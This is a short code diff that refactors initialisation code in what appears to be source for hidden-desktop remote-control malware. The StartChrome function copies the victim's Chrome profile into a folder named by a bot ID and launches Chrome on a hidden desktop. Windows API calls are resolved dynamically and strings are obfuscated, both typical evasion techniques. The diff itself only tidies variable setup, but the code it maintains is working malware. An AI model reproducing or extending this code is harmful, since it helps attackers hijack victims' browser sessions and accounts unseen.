@@ -519,40 +519,33 @@ static void killproc(const char* name)
 
 static void StartChrome()
 {
-    char chromePath[MAX_PATH];
-    chromePath[0] = '\0';
+    char chromePath[MAX_PATH] = { 0 };
     Funcs::pSHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, chromePath);
     Funcs::pLstrcatA(chromePath, Strs::hd7);
 
-    char dataPath[MAX_PATH];
-    dataPath[0] = '\0';
+    char dataPath[MAX_PATH] = { 0 };
     Funcs::pLstrcpyA(dataPath, chromePath);
     Funcs::pLstrcatA(dataPath, Strs::hd10);
 
-    char botId[BOT_ID_LEN];
-    botId[0] = '\0';
-    char newDataPath[MAX_PATH];
-    newDataPath[0] = '\0';
+    char botId[BOT_ID_LEN] = { 0 };
+    char newDataPath[MAX_PATH] = { 0 };
     Funcs::pLstrcpyA(newDataPath, chromePath);
     GetBotId(botId);
     Funcs::pLstrcatA(newDataPath, botId);
 
     CopyDir(dataPath, newDataPath);
 
-    char path[MAX_PATH];
-    path[0] = '\0';
+    char path[MAX_PATH] = { 0 };
     Funcs::pLstrcpyA(path, Strs::hd8);
     Funcs::pLstrcatA(path, Strs::chromeExe);
     Funcs::pLstrcatA(path, Strs::hd9);
     Funcs::pLstrcatA(path, "\"");
     Funcs::pLstrcatA(path, newDataPath);
 
-    STARTUPINFOA startupInfo;
-    ZeroMemory(&startupInfo, sizeof(startupInfo));
+    STARTUPINFOA startupInfo = { 0 };
     startupInfo.cb = sizeof(startupInfo);
     startupInfo.lpDesktop = g_desktopName;
-    PROCESS_INFORMATION processInfo;
-    ZeroMemory(&processInfo, sizeof(processInfo));
+    PROCESS_INFORMATION processInfo = { 0 };
     Funcs::pCreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
 }
 
@@ -889,8 +882,7 @@ static DWORD WINAPI InputThread(LPVOID param)
                 }
                 else
                 {
-                    char windowClass[MAX_PATH];
-                    windowClass[0] = '\0';
+                    char windowClass[MAX_PATH] = { 0 };
                     Funcs::pRealGetWindowClassA(hWnd, windowClass, MAX_PATH);
 
                     if (!Funcs::pLstrcmpA(windowClass, Strs::hd1))
